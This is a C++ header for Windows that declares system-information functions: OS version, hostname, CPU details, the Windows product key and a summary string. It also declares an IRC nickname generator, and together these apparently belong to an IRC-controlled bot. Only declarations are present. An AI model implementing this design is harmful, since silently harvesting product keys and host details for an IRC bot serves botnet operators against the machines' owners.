#ifndef SYSINFO_H_
#define SYSINFO_H_

#define WIN32_LEAN_AND_MEAN

#include <sstream>
#include <cstdlib>
#include <time.h>
#include <winsock2.h>
#include <windows.h>

namespace SysInfo {
	// Operating System
	std::string getOSVersionName();
	std::string getShortOSVersionName();
	std::string getHostname();
	std::string getCPUArch();
	int getCPUCount();
    std::string getWindowsProductKey();
	std::string SysInfoString();

	// IRC
	std::string generateIRCNickname();
}

#endif /* SYSINFO_H_*/
